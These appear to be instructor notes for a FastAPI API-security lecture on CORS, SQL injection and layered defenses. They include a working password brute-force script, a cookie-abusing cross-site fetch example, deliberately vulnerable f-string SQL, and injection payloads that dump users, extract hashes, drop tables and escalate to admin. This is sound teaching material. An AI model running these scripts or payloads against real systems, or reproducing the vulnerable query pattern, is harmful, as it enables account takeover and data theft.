# LECTURE DESIGN PHILOSOPHY

```
┌─────────────────────────────────────────────────────────────────┐
│                    PEDAGOGICAL APPROACH                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ATTACK FIRST, DEFEND SECOND                                    │
│  ───────────────────────────                                    │
│  Students must SEE their API getting attacked before they       │
│  care about security. We show the exploit, then the fix.        │
│                                                                 │
│  ANALOGY-DRIVEN                                                 │
│  ──────────────                                                 │
│  Security is abstract until it isn't. We use a Bank analogy     │
│  throughout. Every concept maps to physical security.           │
│                                                                 │
│  CONNECT TO PRIOR LECTURES, DON'T RE-TEACH                     │
│  ──────────────────────────────────────────                     │
│  Pydantic (Wk 3) → validation as security layer                │
│  SQLAlchemy (Wk 5-6) → why ORM prevents injection              │
│  Dependencies (Wk 3) → security as dependency chain             │
│  JWT + RBAC (Wk 9 L1-3) → what we're now protecting            │
│  httpx (Wk 8) → the attacker's tool of choice                  │
│  Custom exceptions (Wk 1) → custom security responses          │
│  Middleware concept (Wk 3) → security as middleware layers      │
│                                                                 │
│  SECURITY IS NOT A FEATURE — IT'S A MINDSET                    │
│  ────────────────────────────────────────────                   │
│  Every section ends with: "What if you DIDN'T do this?"         │
│  Consequences make abstract rules concrete.                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

# LECTURE OUTLINE

```
┌─────────────────────────────────────────────────────────────────┐
│                       API SECURITY                              │
│                     (3.5-4 Hour Lecture)                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PART 1: YOUR API IS A TARGET (30 min)                          │
│  ├─ 1.1 The Attack Demo (Watch Your API Get Broken)             │
│  ├─ 1.2 The Bank Analogy                                        │
│  └─ 1.3 Defense in Depth (Layered Security)                     │
│                                                                 │
│  PART 2: CORS — THE GUEST LIST (50 min)                         │
│  ├─ 2.1 The Same-Origin Policy (Why Browsers Block Requests)    │
│  ├─ 2.2 What is CORS? (Cross-Origin Resource Sharing)           │
│  ├─ 2.3 Preflight Requests (The OPTIONS Handshake)              │
│  ├─ 2.4 Configuring CORS in FastAPI                             │
│  └─ 2.5 Common CORS Mistakes                                    │
│                                                                 │
│  PART 3: SQL INJECTION — THE FORGED DEPOSIT SLIP (40 min)       │
│  ├─ 3.1 The Classic Attack (Bobby Tables)                       │
│  ├─ 3.2 How SQLAlchemy Protects You (Connection to Wk 5-6)     │
│  ├─ 3.3 When You're Still Vulnerable (text() + f-strings)       │
│  └─ 3.4 The Golden Rule                                         │
│                                                                 │
│  PART 4: INPUT VALIDATION AS SECURITY (30 min)                  │
│  ├─ 4.1 Never Trust the Client                                  │
│  ├─ 4.2 Pydantic as Your Security Guard (Connection to Wk 3)    │
│  ├─ 4.3 Beyond Type Checking (Security-Focused Validation)      │
│  └─ 4.4 Dangerous Inputs You Might Not Expect                   │
│                                                                 │
│  PART 5: RATE LIMITING AUTH ENDPOINTS (40 min)                  │
│  ├─ 5.1 The Brute Force Attack (Battering Ram Demo)             │
│  ├─ 5.2 Why Auth Endpoints Are Special Targets                  │
│  ├─ 5.3 Implementing Rate Limiting with slowapi                 │
│  └─ 5.4 Rate Limit Headers and Custom Responses                 │
│                                                                 │
│  PART 6: SECURITY HEADERS — THE BUILDING CODES (25 min)         │
│  ├─ 6.1 What Are Security Headers?                              │
│  ├─ 6.2 Essential Headers for APIs                              │
│  └─ 6.3 Custom Security Headers Middleware                      │
│                                                                 │
│  PART 7: OWASP API SECURITY TOP 10 — KNOW YOUR ENEMY (25 min)  │
│  ├─ 7.1 What is OWASP?                                          │
│  ├─ 7.2 The API Security Top 10 (Mapped to What You Know)       │
│  └─ 7.3 Your Security Checklist                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

# PART 1: YOUR API IS A TARGET

## 1.1 The Attack Demo

**Start with violence. Show them their API getting destroyed.**

> "Before this lecture, you built JWT auth, RBAC, protected endpoints. You feel safe. Let me show you what an attacker does to your Task Manager API in under 60 seconds."

```python
# attacker.py — What happens the day you deploy
import httpx
import asyncio
import time

# These are REAL common passwords. Attackers use lists of MILLIONS.
COMMON_PASSWORDS = [
    "password", "123456", "password123", "admin", "letmein",
    "welcome", "monkey", "dragon", "master", "qwerty",
    "login", "abc123", "starwars", "trustno1", "iloveyou",
]

async def brute_force_login(base_url: str, email: str) -> None:
    """Try common passwords against a login endpoint."""
    async with httpx.AsyncClient() as client:
        start = time.time()
        attempts = 0

        for password in COMMON_PASSWORDS:
            attempts += 1
            response = await client.post(
                f"{base_url}/auth/login",
                json={"email": email, "password": password},
            )

            if response.status_code == 200:
                token = response.json()["access_token"]
                elapsed = time.time() - start
                print(f"\n🔓 PASSWORD FOUND: '{password}'")
                print(f"   Attempts: {attempts}")
                print(f"   Time: {elapsed:.2f}s")
                print(f"   Token: {token[:50]}...")
                return

            # No rate limit? No delay needed. Just keep hammering.

        print(f"Tried {attempts} passwords in {time.time() - start:.2f}s")

async def main():
    # Target: your unprotected Task Manager
    await brute_force_login(
        "http://localhost:8000",
        "admin@taskmanager.com",
    )

asyncio.run(main())
```

**Run it against the Task Manager API the class built in Lectures 1-3:**

```
🔓 PASSWORD FOUND: 'admin'
   Attempts: 4
   Time: 0.31s
   Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdW...
```

**Let that sink in.**

> "Four attempts. A third of a second. And that was just 15 passwords. Real attackers use lists with 10 MILLION passwords. Your bcrypt hashing from Lecture 1? It's protecting the password in the database. But it does NOTHING to stop someone from guessing passwords through your login endpoint. You need more layers."

---

## 1.2 The Bank Analogy

**This analogy carries through the ENTIRE lecture.**

```
┌─────────────────────────────────────────────────────────────────┐
│                    THE BANK ANALOGY                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Your API is a BANK open to the public internet.                │
│                                                                 │
│  Bank                         │  Your API                       │
│  ─────────────────────────────│──────────────────────────       │
│  The building                 │  Your server                    │
│  Service windows (counters)   │  API endpoints                  │
│  Customers walking in         │  HTTP requests                  │
│  Deposit slips / forms        │  Request bodies (JSON)          │
│  The safe / vault             │  Your database                  │
│                               │                                 │
│  NOW THE SECURITY:            │                                 │
│  ─────────────────────────────│──────────────────────────       │
│  Guest list for partners      │  CORS (allowed origins)         │
│  Teller checking every form   │  Pydantic validation            │
│  Forged deposit instructions  │  SQL injection payloads         │
│  Vault brute-force lockout    │  Rate limiting on login         │
│  Building codes & regulations │  Security headers               │
│  FBI's "Top 10 Heist Methods" │  OWASP Top 10                   │
│                                                                 │
│  A bank with ONE lock is a crime scene waiting to happen.       │
│  A bank with MANY layers of security is a fortress.             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 1.3 Defense in Depth

**No single layer is enough. You need MANY layers:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    DEFENSE IN DEPTH                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│                    THE INTERNET                                 │
│                        │                                        │
│                        ▼                                        │
│           ┌────────────────────────┐                            │
│           │  CORS Policy           │  ← "Who can even talk      │
│           │  (allowed origins)     │     to us?"                │
│           └───────────┬────────────┘                            │
│                       ▼                                         │
│           ┌────────────────────────┐                            │
│           │  Security Headers      │  ← "The rules of           │
│           │  (browser instructions)│     engagement"            │
│           └───────────┬────────────┘                            │
│                       ▼                                         │
│           ┌────────────────────────┐                            │
│           │  Rate Limiting         │  ← "Don't come back        │
│           │  (request throttling)  │     too often"             │
│           └───────────┬────────────┘                            │
│                       ▼                                         │
│           ┌────────────────────────┐                            │
│           │  Input Validation      │  ← "Your form looks        │
│           │  (Pydantic)            │     suspicious"            │
│           └───────────┬────────────┘                            │
│                       ▼                                         │
│           ┌────────────────────────┐                            │
│           │  Authentication        │  ← "Prove who you are"     │
│           │  (JWT — Lecture 2)     │                            │
│           └───────────┬────────────┘                            │
│                       ▼                                         │
│           ┌────────────────────────┐                            │
│           │  Authorization         │  ← "Are you ALLOWED        │
│           │  (RBAC — Lecture 3)    │     to do this?"           │
│           └───────────┬────────────┘                            │
│                       ▼                                         │
│           ┌────────────────────────┐                            │
│           │  Parameterized Queries │  ← "No forged              │
│           │  (SQLAlchemy ORM)      │     instructions"          │
│           └───────────┬────────────┘                            │
│                       ▼                                         │
│                  [ DATABASE ]                                   │
│                                                                 │
│  An attacker must break through EVERY layer.                    │
│  You already built Authentication + Authorization.              │
│  Today we build the other layers.                               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

> "Authentication (Lectures 1-2) proves who someone IS. Authorization (Lecture 3) controls what they CAN DO. Today's lecture is about everything AROUND those — the walls, the guards, and the building codes that keep the whole bank safe."

---

# PART 2: CORS — THE GUEST LIST

## 2.1 The Same-Origin Policy (Why Browsers Block Requests)

**The core question:**

> "You built your API at `http://localhost:8000`. Your teammate builds a React frontend at `http://localhost:3000`. They write `fetch('http://localhost:8000/tasks')`. It fails. Why?"

```
┌─────────────────────────────────────────────────────────────────┐
│                THE SAME-ORIGIN POLICY                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Every browser enforces the SAME-ORIGIN POLICY:                 │
│                                                                 │
│  "A web page at Origin A can only make requests to              │
│   Origin A. Requests to Origin B are BLOCKED by default."       │
│                                                                 │
│                                                                 │
│  What is an "origin"?                                           │
│  ─────────────────────                                          │
│  An origin = PROTOCOL + DOMAIN + PORT                           │
│                                                                 │
│  http://localhost:3000    ← Origin A (React frontend)           │
│  http://localhost:8000    ← Origin B (FastAPI backend)          │
│  ▲         ▲         ▲                                          │
│  │         │         │                                          │
│  protocol  domain    port                                       │
│                                                                 │
│  Same domain, DIFFERENT PORT → DIFFERENT ORIGIN                 │
│                                                                 │
│                                                                 │
│  MORE EXAMPLES:                                                 │
│  ──────────────                                                 │
│  https://myapp.com  vs  https://api.myapp.com   → DIFFERENT ❌  │
│  https://myapp.com  vs  http://myapp.com        → DIFFERENT ❌  │
│  https://myapp.com  vs  https://myapp.com:8443  → DIFFERENT ❌  │
│  https://myapp.com  vs  https://myapp.com       → SAME ✅       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Why does this policy exist?**

```
┌─────────────────────────────────────────────────────────────────┐
│              WHY THE SAME-ORIGIN POLICY EXISTS                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  WITHOUT this policy, here's what an attacker does:             │
│                                                                 │
│  1. You log in to your bank: https://mybank.com                 │
│     (your browser now has your auth cookie/token)               │
│                                                                 │
│  2. You visit a malicious site: https://evil-site.com           │
│                                                                 │
│  3. Evil site's JavaScript runs in YOUR browser:                │
│                                                                 │
│     // evil-site.com's JavaScript                               │
│     fetch("https://mybank.com/api/transfer", {                  │
│         method: "POST",                                         │
│         body: JSON.stringify({                                   │
│             to: "attacker-account",                              │
│             amount: 10000                                        │
│         }),                                                      │
│         credentials: "include"  // sends YOUR cookies!          │
│     })                                                           │
│                                                                 │
│  4. Without same-origin policy, the browser sends this          │
│     request WITH your bank cookies. Money gone.                 │
│                                                                 │
│  The same-origin policy PREVENTS step 3 from succeeding.        │
│  evil-site.com ≠ mybank.com → browser blocks the request.       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**The bank analogy:**

> "The same-origin policy is like a bank rule that says: 'Only people who walked in through OUR front door can request transactions. We don't accept requests passed through the window from someone standing outside.' It protects your customers from being tricked."

---

## 2.2 What is CORS?

**The same-origin policy is too strict for modern apps. CORS relaxes it SELECTIVELY.**

```
┌─────────────────────────────────────────────────────────────────┐
│                    WHAT IS CORS?                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CORS = Cross-Origin Resource Sharing                           │
│                                                                 │
│  A mechanism that lets a SERVER tell browsers:                  │
│  "I ALLOW requests from these specific origins."                │
│                                                                 │
│  It works through HTTP HEADERS in the server's response.        │
│                                                                 │
│                                                                 │
│  WITHOUT CORS configured:                                       │
│  ─────────────────────────                                      │
│                                                                 │
│  Browser (localhost:3000)          Server (localhost:8000)       │
│  ────────────────────────          ─────────────────────        │
│       │                                                         │
│       │──── GET /tasks ──────────────▶│                         │
│       │                               │── returns response      │
│       │◀──── Response ────────────────│                         │
│       │                                                         │
│       │ 🚫 "No Access-Control-Allow-Origin header.              │
│       │     I'm blocking this."                                 │
│       │                                                         │
│       ▼ JavaScript gets: TypeError: Failed to fetch             │
│                                                                 │
│                                                                 │
│  WITH CORS configured:                                          │
│  ──────────────────────                                         │
│                                                                 │
│  Browser (localhost:3000)          Server (localhost:8000)       │
│  ────────────────────────          ─────────────────────        │
│       │                                                         │
│       │──── GET /tasks ──────────────▶│                         │
│       │     Origin: localhost:3000    │                         │
│       │                               │── checks allow list     │
│       │◀──── Response ────────────────│                         │
│       │  Access-Control-Allow-Origin: │                         │
│       │  http://localhost:3000        │                         │
│       │                                                         │
│       │ ✅ "Server says localhost:3000 is allowed.              │
│       │     Here's your data, JavaScript."                      │
│       │                                                         │
│       ▼ JavaScript gets: {tasks: [...]}                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**CRITICAL UNDERSTANDING:**

```
┌─────────────────────────────────────────────────────────────────┐
│              CORS IS A BROWSER FEATURE, NOT A SERVER FEATURE    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  WHO ENFORCES CORS?                                             │
│  ──────────────────                                             │
│  The BROWSER. Not the server. Not your firewall.                │
│  Not your code. The BROWSER.                                    │
│                                                                 │
│  The server just SENDS headers. The browser READS them          │
│  and decides whether to allow JavaScript to see the response.   │
│                                                                 │
│                                                                 │
│  THIS MEANS:                                                    │
│  ────────────                                                   │
│  ✅ curl ignores CORS entirely                                  │
│  ✅ httpx ignores CORS entirely                                 │
│  ✅ Postman ignores CORS entirely                               │
│  ✅ Server-to-server calls ignore CORS entirely                 │
│  ✅ Python scripts ignore CORS entirely                         │
│                                                                 │
│  ONLY browser JavaScript is affected.                           │
│                                                                 │
│                                                                 │
│  WHY THIS MATTERS:                                              │
│  ──────────────────                                             │
│  CORS does NOT protect your server from attacks.                │
│  CORS protects your USERS from malicious websites               │
│  that try to abuse their browser session.                       │
│                                                                 │
│  An attacker with curl can bypass CORS completely.              │
│  That's why you need ALL the other layers too.                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

> "CORS is the bank's guest list for partner institutions. Chase can send customers to your bank. But a random person on the street can still walk up to your window directly. CORS stops partner-level fraud. You still need a teller who checks IDs (authentication), a guard at the vault (rate limiting), and cameras (logging)."

---

## 2.3 Preflight Requests (The OPTIONS Handshake)

**For "complex" requests, browsers do a TWO-STEP process:**

```
┌─────────────────────────────────────────────────────────────────┐
│                   SIMPLE VS PREFLIGHT                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SIMPLE REQUESTS (no preflight):                                │
│  ────────────────────────────────                               │
│  • GET, HEAD, or POST                                           │
│  • Only "simple" headers (Accept, Content-Language, etc.)       │
│  • Content-Type only: text/plain, multipart/form-data,          │
│    or application/x-www-form-urlencoded                         │
│                                                                 │
│                                                                 │
│  PREFLIGHTED REQUESTS (preflight required):                     │
│  ──────────────────────────────────────────                     │
│  • PUT, PATCH, DELETE                                           │
│  • Custom headers (Authorization, X-Custom-*)                   │
│  • Content-Type: application/json    ← THIS ONE!               │
│                                                                 │
│  Since YOUR API uses JSON and Authorization headers,            │
│  almost ALL your endpoints trigger preflight.                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**How preflight works:**

```
┌─────────────────────────────────────────────────────────────────┐
│                  PREFLIGHT SEQUENCE                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Browser                              Server                    │
│  ─────────                            ──────                    │
│     │                                                           │
│     │ STEP 1: "Can I even make this request?"                   │
│     │                                                           │
│     │─── OPTIONS /tasks ──────────────────────▶│                │
│     │    Origin: https://myapp.com             │                │
│     │    Access-Control-Request-Method: POST   │                │
│     │    Access-Control-Request-Headers:        │                │
│     │      Authorization, Content-Type         │                │
│     │                                          │                │
│     │◀── 200 OK ──────────────────────────────│                │
│     │    Access-Control-Allow-Origin:           │                │
│     │      https://myapp.com                   │                │
│     │    Access-Control-Allow-Methods:          │                │
│     │      GET, POST, PUT, DELETE              │                │
│     │    Access-Control-Allow-Headers:          │                │
│     │      Authorization, Content-Type         │                │
│     │    Access-Control-Max-Age: 600           │                │
│     │                                          │                │
│     │ ✅ "Server says OK. Now send the real request."           │
│     │                                                           │
│     │ STEP 2: Actual request                                    │
│     │                                                           │
│     │─── POST /tasks ─────────────────────────▶│                │
│     │    Origin: https://myapp.com             │                │
│     │    Authorization: Bearer eyJhb...        │                │
│     │    Content-Type: application/json        │                │
│     │    {"title": "New task"}                 │                │
│     │                                          │                │
│     │◀── 201 Created ─────────────────────────│                │
│     │    Access-Control-Allow-Origin:           │                │
│     │      https://myapp.com                   │                │
│     │    {"id": 1, "title": "New task"}        │                │
│     │                                                           │
│     ▼                                                           │
│                                                                 │
│  The preflight is AUTOMATIC. JavaScript doesn't send it         │
│  explicitly. The browser inserts it before the real request.    │
│                                                                 │
│  Access-Control-Max-Age: 600 means "cache this preflight        │
│  result for 600 seconds, don't ask again for 10 minutes."       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

> "Preflight is the browser calling your bank ahead of time: 'Hi, I'm sending a customer from MyApp. They'll need to make a POST transaction with a JWT badge. Is that allowed?' Your bank responds: 'Yes, MyApp is a partner, those methods and credentials are fine.' Only THEN does the real request go through."

---

## 2.4 Configuring CORS in FastAPI

**FastAPI provides `CORSMiddleware` from Starlette:**

```python
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

# Define which origins can access your API
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://myapp.com",
        "https://admin.myapp.com",
    ],
    allow_credentials=True,   # Allow cookies/Authorization headers
    allow_methods=["GET", "POST", "PUT", "DELETE"],  # Allowed HTTP methods
    allow_headers=["Authorization", "Content-Type"],  # Allowed request headers
    max_age=600,  # Cache preflight for 10 minutes
)
```

**What each parameter means:**

```
┌─────────────────────────────────────────────────────────────────┐
│                CORS MIDDLEWARE PARAMETERS                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  allow_origins         │  List of allowed origins               │
│                        │  "Which partner banks can send         │
│                        │   customers to us?"                    │
│                        │                                        │
│  allow_credentials     │  Allow Authorization header & cookies  │
│                        │  "Can partners send customers with     │
│                        │   their bank cards?"                   │
│                        │                                        │
│  allow_methods         │  Which HTTP methods cross-origin       │
│                        │  "Can partners do transfers (POST)     │
│                        │   or just check balances (GET)?"       │
│                        │                                        │
│  allow_headers         │  Which custom headers are allowed      │
│                        │  "Can partners send their own          │
│                        │   identification badges?"              │
│                        │                                        │
│  max_age               │  How long to cache preflight (seconds) │
│                        │  "How long is this permission valid    │
│                        │   before you need to ask again?"       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Development vs Production configuration:**

```python
import os

# ✅ CORRECT: Different CORS settings per environment

ENVIRONMENT = os.getenv("ENVIRONMENT", "development")

if ENVIRONMENT == "development":
    # Relaxed for local development
    origins = [
        "http://localhost:3000",     # React dev server
        "http://localhost:5173",     # Vite dev server
        "http://127.0.0.1:3000",
    ]
elif ENVIRONMENT == "production":
    # Strict in production — only YOUR domains
    origins = [
        "https://myapp.com",
        "https://admin.myapp.com",
    ]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
    max_age=600,
)
```

---

## 2.5 Common CORS Mistakes

### Mistake 1: The Wildcard with Credentials

```python
# ❌ WRONG: Wildcard origin + credentials = BROWSER REJECTION
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],          # Anyone can access
    allow_credentials=True,       # With auth headers
)
# Browsers REFUSE this combination. It's too dangerous.
# You'll get: "Cannot use wildcard with credentials"

# ✅ CORRECT: Explicit origins when using credentials
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://myapp.com"],
    allow_credentials=True,
)
```

**Why the browser refuses `*` with credentials:**

```
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  If allow_origins=["*"] AND allow_credentials=True:             │
│                                                                 │
│  ANY website could send requests WITH the user's cookies.       │
│  This is EXACTLY the attack the same-origin policy prevents.    │
│  Browsers know this and refuse to allow it.                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Mistake 2: Wildcard in Production

```python
# ❌ DANGEROUS: Don't deploy this to production
allow_origins=["*"]

# This allows EVERY website on the internet to call your API
# from their JavaScript. Including evil-phishing-site.com.
```

> "Leaving `allow_origins=["*"]` in production is like your bank accepting walk-ins from any institution on earth, no questions asked. Every fraudster's dream."

### Mistake 3: Forgetting Preflight Methods

```python
# ❌ WRONG: Missing OPTIONS method
allow_methods=["GET", "POST"]  # No PUT, DELETE, PATCH

# Your frontend tries to update a task:
# fetch("/tasks/1", {method: "PUT", ...})
# → Preflight fails! PUT is not allowed.

# ✅ CORRECT: Include all methods your API uses
allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE"]
```

### Mistake 4: Thinking CORS Protects Your Server

```python
# A confused developer might think:
# "I set allow_origins to only my frontend.
#  Now only my frontend can access my API!"

# WRONG. An attacker uses:
# curl -X POST http://your-api.com/tasks
# httpx.post("http://your-api.com/tasks")
# → These BYPASS CORS entirely. No browser = no CORS.

# CORS protects your USERS (browser-based attacks).
# Authentication + Authorization protects your SERVER.
```

```
┌─────────────────────────────────────────────────────────────────┐
│                 CORS DOES / DOES NOT                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CORS DOES:                                                     │
│  ├─ Prevent malicious websites from using your users' sessions  │
│  ├─ Control which frontends can call your API from browsers     │
│  └─ Add an extra layer of defense for browser-based clients     │
│                                                                 │
│  CORS DOES NOT:                                                 │
│  ├─ Protect against curl, httpx, Postman, scripts               │
│  ├─ Replace authentication or authorization                     │
│  ├─ Prevent server-to-server attacks                            │
│  └─ Make your API "secure" by itself                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

# PART 3: SQL INJECTION — THE FORGED DEPOSIT SLIP

## 3.1 The Classic Attack

> "Imagine a bank teller who reads a deposit slip and executes whatever is written on it — literally, word for word, with no checking. A customer writes: 'Deposit $500 into Account 123. ALSO transfer $50,000 from Account 999 to Account 123.' The teller just... does it. That's SQL injection."

**The vulnerable code (DO NOT write code like this):**

```python
from sqlalchemy import text
from fastapi import APIRouter, Depends
from sqlalchemy.ext.asyncio import AsyncSession

router = APIRouter()

# ❌ CATASTROPHICALLY VULNERABLE
@router.get("/users/search")
async def search_users(
    name: str,
    db: AsyncSession = Depends(get_db),
):
    # Building SQL with string formatting — NEVER DO THIS
    query = text(f"SELECT * FROM users WHERE name = '{name}'")
    result = await db.execute(query)
    return result.mappings().all()
```

**The normal request:**

```
GET /users/search?name=Alice

SQL executed: SELECT * FROM users WHERE name = 'Alice'
Result: [{id: 1, name: "Alice", email: "alice@example.com"}]
```

**The attack:**

```
GET /users/search?name=' OR '1'='1

SQL executed: SELECT * FROM users WHERE name = '' OR '1'='1'
                                                    ^^^^^^^^^
                                                    Always true!
Result: ALL USERS IN THE DATABASE
```

**Visualize what happened:**

```
┌─────────────────────────────────────────────────────────────────┐
│                  SQL INJECTION ANATOMY                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Template:  SELECT * FROM users WHERE name = '{name}'           │
│                                                                 │
│  Normal input:  name = "Alice"                                  │
│  Becomes:       SELECT * FROM users WHERE name = 'Alice'        │
│  Result:        ✅ Returns user Alice                           │
│                                                                 │
│                                                                 │
│  Malicious input:  name = "' OR '1'='1"                         │
│  Becomes:          SELECT * FROM users WHERE name = ''          │
│                    OR '1'='1'                                    │
│                       ^^^^^^^^^                                 │
│                       Injected!                                 │
│  Result:        💀 Returns ALL users                            │
│                                                                 │
│                                                                 │
│  Destructive input:  name = "'; DROP TABLE users; --"           │
│  Becomes:            SELECT * FROM users WHERE name = '';        │
│                      DROP TABLE users;                           │
│                      --'                                        │
│  Result:        💀💀💀 DATABASE TABLE DELETED                   │
│                                                                 │
│  The attacker's input ESCAPED the quotes and became             │
│  part of the SQL command itself.                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Run the full attack scenario with the class watching:**

```python
# attacker.py — SQL injection through your search endpoint
import httpx

# 1. Dump all users
response = httpx.get(
    "http://localhost:8000/users/search",
    params={"name": "' OR '1'='1"},
)
print("All users:", response.json())

# 2. Extract passwords (if stored badly — hopefully they aren't)
response = httpx.get(
    "http://localhost:8000/users/search",
    params={"name": "' UNION SELECT id, email, hashed_password, role FROM users --"},
)
print("Password hashes:", response.json())

# 3. Escalate privileges
response = httpx.get(
    "http://localhost:8000/users/search",
    params={"name": "'; UPDATE users SET role='admin' WHERE email='attacker@evil.com'; --"},
)
print("Now I'm admin.")
```

> "With ONE input field, an attacker can read your entire database, extract password hashes, and make themselves admin. This is not theoretical. SQL injection has been the #1 web vulnerability for over a decade."

---

## 3.2 How SQLAlchemy Protects You

**Connection to Week 5-6:** Your ORM already prevents this. Here's why.

```python
# ✅ SAFE: SQLAlchemy ORM (what you've been using since Week 6)
from sqlalchemy import select
from app.models import User

@router.get("/users/search")
async def search_users(
    name: str,
    db: AsyncSession = Depends(get_db),
):
    stmt = select(User).where(User.name == name)
    result = await db.execute(stmt)
    return result.scalars().all()
```

**Why is this safe?**

```
┌─────────────────────────────────────────────────────────────────┐
│             HOW PARAMETERIZED QUERIES WORK                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  STRING FORMATTING (vulnerable):                                │
│  ──────────────────────────────                                 │
│  Your code builds the ENTIRE SQL string, including user input.  │
│  The database can't tell query from data.                       │
│                                                                 │
│  f"SELECT * FROM users WHERE name = '{name}'"                   │
│                                       ^^^^^^                    │
│                                       Mixed into SQL!           │
│                                                                 │
│                                                                 │
│  PARAMETERIZED QUERY (safe):                                    │
│  ───────────────────────────                                    │
│  Your code sends the SQL template AND the data SEPARATELY.      │
│  The database knows: "This is the query. That is the data."     │
│                                                                 │
│     Step 1 (your code sends):                                   │
│     ┌──────────────────────────────────────────┐                │
│     │ Query: SELECT * FROM users WHERE name = ? │  ← template  │
│     │ Param: "' OR '1'='1"                      │  ← data      │
│     └──────────────────────────────────────────┘                │
│                                                                 │
│     Step 2 (database processes):                                │
│     "Find a user whose name is LITERALLY the string             │
│      ' OR '1'='1   — quote marks and all."                      │
│                                                                 │
│     Result: No user found (no one is named that).               │
│             Attack failed.                                      │
│                                                                 │
│  The malicious SQL NEVER gets executed as SQL.                  │
│  It's treated as a plain string value.                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**SQLAlchemy's ORM ALWAYS uses parameterized queries under the hood.** Every `.where()`, `.filter()`, `.filter_by()` you've been writing since Week 6 generates parameterized queries. You've been safe this whole time — but you need to understand WHY, because that understanding tells you WHEN you're NOT safe.

---

## 3.3 When You're Still Vulnerable

**The ORM protects you. But there are escape hatches that DON'T:**

```python
from sqlalchemy import text

# ❌ VULNERABLE: text() with f-string
query = text(f"SELECT * FROM users WHERE name = '{name}'")
await db.execute(query)

# ❌ VULNERABLE: text() with .format()
query = text("SELECT * FROM users WHERE name = '{}'".format(name))
await db.execute(query)

# ❌ VULNERABLE: text() with string concatenation
query = text("SELECT * FROM users WHERE name = '" + name + "'")
await db.execute(query)


# ✅ SAFE: text() with bound parameters
query = text("SELECT * FROM users WHERE name = :name")
await db.execute(query, {"name": name})

# ✅ SAFE: ORM query (always parameterized)
stmt = select(User).where(User.name == name)
await db.execute(stmt)
```

**When would you use raw SQL `text()`?**

```
┌─────────────────────────────────────────────────────────────────┐
│            WHEN RAW SQL IS JUSTIFIED                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Sometimes the ORM can't express a complex query:               │
│                                                                 │
│  • Complex aggregations with window functions                   │
│  • Database-specific features (PostgreSQL full-text search)     │
│  • Performance-critical queries where you need exact SQL        │
│  • Data migrations (Alembic data migration scripts)             │
│                                                                 │
│  When you MUST use text(), ALWAYS use bound parameters:         │
│                                                                 │
│  query = text("""                                               │
│      SELECT u.name, COUNT(t.id) as task_count                   │
│      FROM users u                                               │
│      LEFT JOIN tasks t ON t.user_id = u.id                      │
│      WHERE u.organization_id = :org_id                          │
│        AND t.status = :status                                   │
│      GROUP BY u.name                                            │
│      HAVING COUNT(t.id) > :min_count                            │
│  """)                                                           │
│                                                                 │
│  result = await db.execute(query, {                             │
│      "org_id": org_id,        # ← parameter, NOT f-string      │
│      "status": status,        # ← parameter, NOT f-string      │
│      "min_count": min_count,  # ← parameter, NOT f-string      │
│  })                                                             │
│                                                                 │
│  Every :name in the query maps to a key in the dict.            │
│  The database driver handles escaping. You're safe.             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 3.4 The Golden Rule

```
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │                                                           │  │
│  │   NEVER put user input into a SQL string.                 │  │
│  │                                                           │  │
│  │   Not with f-strings. Not with .format().                 │  │
│  │   Not with concatenation. NEVER.                          │  │
│  │                                                           │  │
│  │   Use the ORM.                                            │  │
│  │   If you must use raw SQL, use bound parameters.          │  │
│  │                                                           │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  This rule has NO exceptions. There is NEVER a good reason      │
│  to build SQL with string formatting from user input.           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**What if you DIDN'T follow this rule?**

> "In 2017, Equifax was breached. 147 million people's Social Security numbers, birth dates, and addresses were stolen. In 2019, Capital One lost 100 million customer records. Injection attacks remain in the OWASP Top 10 decade after decade. Not because the fix is hard — parameterized queries are EASY. But because one developer, one time, wrote an f-string instead."

---

